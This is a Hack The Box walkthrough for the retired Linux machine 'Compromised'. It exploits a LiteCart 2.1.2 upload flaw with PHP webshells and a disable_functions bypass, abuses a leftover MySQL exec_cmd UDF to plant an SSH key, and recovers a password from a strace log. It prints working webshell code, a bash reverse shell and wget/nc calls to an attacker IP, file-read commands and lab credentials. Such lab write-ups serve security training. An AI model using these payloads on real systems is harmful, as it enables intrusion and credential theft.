---
layout: post
title: Compromised
date: 2021-01-23 00:00:01 +5:30
categories: [Hackthebox, Medium]
tags: [osint, dirbust, code-analysis, Exploit, mysql, Shellcode] # add tag
image: /assets/img/Compromis/00.png
---

|Machine|Detail
|:---|:--
|Release date | 12 Sep 2020
|Retire Date | 23 Jan 2021
|OS | Linux
|Rating | Medium
|Creator | [D4nch3n](https://www.hackthebox.eu/home/users/profile/103781)

# Summary

Compromised involves a box that’s already been hacked, and so the challenge is to follow the hacker and both exploit public vulnerabilities as well as make use of backdoors left behind by the hacker. I’ll find a website backup file that shows how the login page was backdoored to record admin credentials to a web accessible file. With those creds, I’ll exploit a vulnerable LiteCart instance, though the public exploit doesn’t work. I’ll troubleshot that to find that the PHP functions typically used for execution are disabled. I’ll show two ways to work around that to get access to the database and execution as the mysql user, who’s shell has been enabled by the hacker. As the mysql user, I’ll find a strace log, likely a makeshift keylogger used by the hacker with creds to pivot to the next user. To get root, I’ll take advantage of either of two backdoors left on the box by the attacker, a PAM backdoor and a LDPRELOAD backdoor. In Beyond Root, I’ll show how to run commands as root using the PAM backdoor from the webshell as www-data

# Intro

The first thing I did for penetration testing was the Infomasion Gathering of targets

# Nmap 

nmap found two open TCP ports, SSH (22) and HTTP (80):

```bash
root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.207
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 07:19 EST
Nmap scan report for 10.10.10.207
Host is up (0.045s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.207
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 07:19 EST
Nmap scan report for 10.10.10.207
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

Based on the OpenSSH and Apache versions, the host is likely running Ubuntu Bionic 18.04.

## Website - TCP 80
### Site
The page is a commercial platform selling rubber ducks:

![01](/assets/img/Compromis/01.png)

### Tech Stack
The site has a “LiteCart” logo at the top right. LiteCart is a “e-commerce platform built with PHP, jQuery and HTML 5.” Even without the logo, the HTTP response headers also show LiteCart:

```
HTTP/1.1 200 OK
Date: Sat, 23 Jan 2021 12:25:10 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Powered-By: LiteCart
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: language_code=en; expires=Mon, 15-Feb-2021 12:25:10 GMT; Max-Age=2592000; path=/shop/
Set-Cookie: currency_code=USD; expires=Mon, 15-Feb-2021 12:25:10 GMT; Max-Age=2592000; path=/shop/
Content-Language: en
Vary: Accept-Encoding
Content-Length: 22423
Connection: close
Content-Type: text/html; charset=UTF-8
```
I don’t see a version number anywhere.

There is an exploit for LiteCart in searchsploit:

```
root@kali# searchsploit litecart
------------------------------------ ---------------------------------
 Exploit Title                      |  Path
------------------------------------ ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upl | php/webapps/45267.py
------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```
It is arbitrary file upload, but taking a quick look at it with searchsploit -x php/webapps/45267.py, it requires auth.

### Directory Brute Force
I’ll run gobuster against the site, and include -x php since I know the site is PHP:

```bash
root@kali# gobuster dir -u http://10.10.10.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-root-small-php -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/23 07:23:55 Starting gobuster
===============================================================
/shop (Status: 301)
/index.php (Status: 302)
/backup (Status: 301)
===============================================================
2021/01/23 07:25:32 Finished
```
### Backup
/backup is directory-listable, serving a single file, a.tar.gz:

![02](/assets/img/Compromis/02.png)

The archive contains a backup for the website. The source code shows the root folder contains an interesting file, .sh.php:

```<?php system($_REQUEST['cmd']); ?>```

This file isn’t on the host anymore, but perhaps was put up there when the box was compromised.

I spent far too long looking for a config file that would contain the password. I found a password for the database in includes/config.inc.php:

```// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');```

The password “changethis” could very well be wrong in this case. It certainly doesn’t work to get into the admin panel.

Eventually some recursive grep found this in shop/admin/login.php:

```if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }```

That commented line is interesting. Given the theme of this box is likely that it’s already compromised, maybe the other hacker left that behind to collect creds. That log file is still on the server:

```root@kali# curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
User: admin Passwd: theNextGenSt0r3!~```

Logging in at /shop/admin/login.php with those creds works:

![02](/assets/img/Compromis/02.png)

At the bottom, it identifies the LiteCart version, 2.1.2, which is the one with the upload vulnerability.

# Shell as mysql

### Exploit

The exploit is a pretty simple upload vulnerability, where a PHP file can be uploaded using the vQmods interface in LiteCart. I’ll log into the admin interface at /shop/admin like above, and at the very bottom of the menu on the left is “vQmods”, which leads to this page:

![03](/assets/img/Compromis/03.png)

There’s client-side filtering requiring a file with a .xml extension, but I can catch the request in Burp (or use the exploit script to bypass client-side filtering) and change the file name to .php, and the file will upload.

### Exploit Troubleshooting

I’ll use the exploit script from here out, but it would be just as easy to do things manually. Running the exploit from searchsploit doesn’t completely work, returning an empty line where the output should be:

```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id```

The exploit is nice enough to give me the address of the webshell, and visiting it returns an empty page:

```bash
root@kali# curl -v http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id
*   Trying 10.10.10.207:80...
* Connected to 10.10.10.207 (10.10.10.207) port 80 (#0)
> GET /shop/vqmod/xml/S59WW.php?c=id HTTP/1.1
> Host: 10.10.10.207
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 16 Jan 2021 20:00:20 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.10.207 left intact
```

So the upload succeeded, but the execution isn’t working. I can check that a different way by modifying the script. It’s this line that sets the payload:

```files = {
        'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }```

I’ll change that to something more benign:

```files = {
        'vqmod': (rand + ".php", "<?php echo 'darksec was here'; } ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }```

it works:

```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/XPKU4.php?c=id
darksec was here```

phpinfo() will provide useful information about the box:

```files = {
        'vqmod': (rand + ".php", '<?php phpinfo();  ?>', "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }```

```bash
root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/DPYLZ.php?c=id
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
...[snip]...
```

I’ll use that address to view the page. In that information, it’s clear why the webshell isn’t working:

![04](/assets/img/Compromis/04.png)

These functions are disabled, including system that’s used in the exploit.

disable_functions can be bypassed pretty easily, but that’s not the intended way to solve this box (I’ll show it in the next section).

## 1. Enumeration via PHP

### Read File / Dir List PHP
I modified the exploit again to upload a PHP file that allows me to get files and directories:

```bash
sploit =<?php
if (isset($_REQUEST['file'])) { 
    echo file_get_contents($_REQUEST['file']);
} 

if (isset($_REQUEST['dir'])) {
    print_r(scandir($_REQUEST['dir']));
}

?>
files = {
        'vqmod': (rand + ".php", sploit, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```

After running that, I can list a directory:

```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "dir=/home"
Array
(
    [0] => .
    [1] => ..
    [2] => sysadmin
)```

This user can’t read in /home/sysadmin.

I can also get a file, like /etc/passwd:

```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false```

### Database

It’s really interesting to note that in the /etc/passwd file, the user mysql has a shell, /bin/bash. That’s unusual, as mysql typically sets the mysql user’s shell to /bin/false. Given the hacked theme of the box, it’s worth looking at this further.

Looking at mysql’s home directory doesn’t return anything, which indicates a permissions issue. I can try to check out the database, especially to see if it can execute. I’ll pull the config file at the same path I noted in the backup. The DB password is still “changethis”:

```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/var/www/html/shop/includes/config.inc.php"
<?php
...[snip]...
// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');  
...[snip]...```

I’ll add some code to my PHP that will run DB queries:

```sploit = """<?php
if (isset($_REQUEST['file'])) { 
    echo file_get_contents($_REQUEST['file']);
} 

if (isset($_REQUEST['dir'])) {
    print_r(scandir($_REQUEST['dir']));
}

if (isset($_REQUEST['db'])) {
    $conn = new mysqli("localhost", "root", "changethis", "ecom") or die("Connect failed: %s\n". $conn -> error);
    $res = mysqli_query($conn, $_REQUEST['db']);
    while ($row = $res->fetch_row()) {
        foreach ($row as $r) {
            echo $r . " ";
        }
        echo "\n";
    }
}

?>
"""```

It works:

```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select @@version'
5.7.30-0ubuntu0.18.04.1```

### exec_cmd

Eventually I checked the mysql.func table, which stores information about user-defined functions created with the CREATE FUNCTION UDF statement. The headers are Name, Ret, dl, type:

```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode 'db=select * from mysql.func;'
exec_cmd 0 libmysql.so function```

exec_cmd isn’t a standard MySQL function, but rather a user defined function (UDF), perhaps left behind by the attacker. Just knowing the name, it’s worth a shot to run something. Command output doesn’t seem to come back (seems like that’s an issue with my shell, as exec_cmd does return data, as I’ll show in the next section), but it does seem to run, as running ping -c 5 takes about five seconds to return.

### Shell
Just like with the webshell, nothing that sends traffic back to my host seems to work. But I can guess that since the user had a shell added, perhaps there’s a .ssh directory. And it works:

```root@kali# curl -s -G 'http://10.10.10.207/shop/admin/../vqmod/xml/NIBI1.php' --data-urlencode "db=SELECT exec_cmd('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\" >> /var/lib/mysql/.ssh/authorized_keys');"
root@kali# ssh -i ~/keys/ed25519_gen mysql@10.10.10.207
The authenticity of host '10.10.10.207 (10.10.10.207)' can't be established.
ECDSA key fingerprint is SHA256:eYvjeWOH3lYrex1T0a/7BQsAv9L4YbZem1T0BGWjtVE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.207' (ECDSA) to the list of known hosts.
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.4
mysql@compromised:~$```

## 2. Bypass disable_functions

### POC
I wrote about Chankro a while back and how it can bypass disable_functions in PHP. Unfortunately for this case, it relies on putenv in PHP, which is listed as blocked in the phpinfo output. Still, there are other ways to bypass these filters. For example, something like this to get execution. It’s a webshell that goes through a bunch of work-arounds to get execution without using any of the functions that get disabled but rather exploiting a bug in PHP. At the top of the PHP code, it calls pwn("uname -a");.

I’ll update the exploit script to read in and send the shell from the GitHub:

```with open("exploit.php", "r") as f:
    exploit = f.read()

files = {
        'vqmod': (rand + ".php", exploit, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }```

On running it, it prints the output of uname:

```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/PMBX7.php?c=id
Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux```

That’s the output of uname -a.

### Webshell
I’ll replace uname with a payload that runs based on the request:

```#pwn("uname -a");
pwn($_REQUEST['c']);```

I used c because the exploit POC uses c in it’s webshell. When I run this, it works:

```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
Shell => http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php?c=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)```

### No Reverse Shell

I wasn’t able to get a full shell from this. It seems that perhaps the firewall is not allowing traffic out? All of these either hung or returned instantly:

```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1'"
^C
root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=wget http://10.10.14.4:443"
^C
root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/VC9II.php --data-urlencode "c=nc 10.10.14.4 443"```

I can pull the iptables rules:

```root@kali# curl -s http://10.10.10.207/shop/vqmod/xml/ASZL5.php --data-urlencode 'c=find /etc/iptables -type f'
/etc/iptables/rules.v4
root@kali# curl -s http://10.10.10.207/shop/vqmod/xml/ASZL5.php --data-urlencode 'c=cat /etc/iptables/rules.v4'
# Generated by iptables-save v1.6.1 on Jan 01 2021 02:27:01
*filter
:INPUT DROP [6:1032]
:FORWARD DROP [0:0]
:OUTPUT DROP [5:394]
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -m tcp -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -m tcp -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 22 -m tcp -j ACCEPT
-A OUTPUT -p tcp -m tcp --sport 80 -m tcp -j ACCEPT
COMMIT
# Completed on Jan 01 2021 02:27:01

Inbound only established, 22, and 80 are allowed. Outbound only established and source port 22 and 80 (coming from SSH and HTTP). Anything I’d want to send outbound will be blocked. Still, this webshell is enough to run mysql commands through. Alteratively, I could write a forward shell (using Ippsec’s technique like I’ve shown several times, including Stratosphere - Ippsec will show this in his Compromised video), or just root from here (see Beyond Root).

###exec_cmd

I can run the mysql binary through this webshell:

```root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT @@version"'
@@version
5.7.30-0ubuntu0.18.04.1```

The exec_cmd function does return output when run this way:

```root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT exec_cmd(\"id\");"'
exec_cmd("id")
uid=111(mysql) gid=113(mysql) groups=113(mysql)\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0```

For some reason it appends a ton of \0 to the end. Multi-line output isn’t handled very well (as in most of it doesn’t come through):

```root@kali# curl -G http://10.10.10.207/shop/admin/../vqmod/xml/7HMS2.php --data-urlencode 'c=mysql -u root -pchangethis -e "SELECT exec_cmd(\"ls /var/lib/mysql\");"'
exec_cmd("ls /var/lib/mysql")
auto.cnf\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0```

Still, I can write an SSH key just like above.

# Shell as sysadmin

## Enumeration

In mysql’s homedir, there’s a file that jumps out as unusual:

```mysql@compromised:~$ ls -l
total 189260
-rw-r----- 1 mysql mysql       56 May  8  2020 auto.cnf
-rw------- 1 mysql mysql     1680 May  8  2020 ca-key.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 ca.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 client-cert.pem
-rw------- 1 mysql mysql     1676 May  8  2020 client-key.pem
-rw-r--r-- 1 root  root         0 May  8  2020 debian-5.7.flag
drwxr-x--- 2 mysql mysql    12288 May 28  2020 ecom
-rw-r----- 1 mysql mysql      527 Sep 12 19:53 ib_buffer_pool
-rw-r----- 1 mysql mysql 79691776 Jan 16 12:21 ibdata1
-rw-r----- 1 mysql mysql 50331648 Jan 16 12:21 ib_logfile0
-rw-r----- 1 mysql mysql 50331648 May 27  2020 ib_logfile1
-rw-r----- 1 mysql mysql 12582912 Jan 17 12:00 ibtmp1
drwxr-x--- 2 mysql mysql     4096 May  8  2020 mysql
drwxr-x--- 2 mysql mysql     4096 May  8  2020 performance_schema
-rw------- 1 mysql mysql     1680 May  8  2020 private_key.pem
-rw-r--r-- 1 mysql mysql      452 May  8  2020 public_key.pem
-rw-r--r-- 1 mysql mysql     1112 May  8  2020 server-cert.pem
-rw------- 1 mysql mysql     1680 May  8  2020 server-key.pem
-r--r----- 1 root  mysql   787180 May 13  2020 strace-log.dat
drwxr-x--- 2 mysql mysql    12288 May  8  2020 sys```

strace-log.dat is owned by root, and readable by the mysql group. Every other file in this folder (except the 0-byte debian-5.7.flag is owned by mysql.) strace is a program designed to intercept and display or log system calls made by another processes. It can also be used by a hacker as a make-shift keylogger.

Running a script like LinPEAS will also highlight this file as interesting:

```[+] Readable files belonging to root and readable by me but not world readable
-r--r----- 1 root mysql 787180 May 13  2020 /var/lib/mysql/strace-log.dat.```

On doing some searching through the file, there’s a place where it’s recording a mysql run where the password is passed on the command line:

```22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0```

## su

That password works for the user on the box, sysadmin:

```mysql@compromised:~$ su sysadmin -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
sysadmin@compromised:/var/lib/mysql$```

And I can grab user.txt:

```sysadmin@compromised:~$ cat user.txt
8fa1e68a************************```

This password also works for SSH:

```root@kali# sshpass -p '3*NLJE32I$Fe' ssh sysadmin@10.10.10.207
Last login: Wed Jan 20 18:37:38 2021 from 10.10.14.4
sysadmin@compromised:~$```




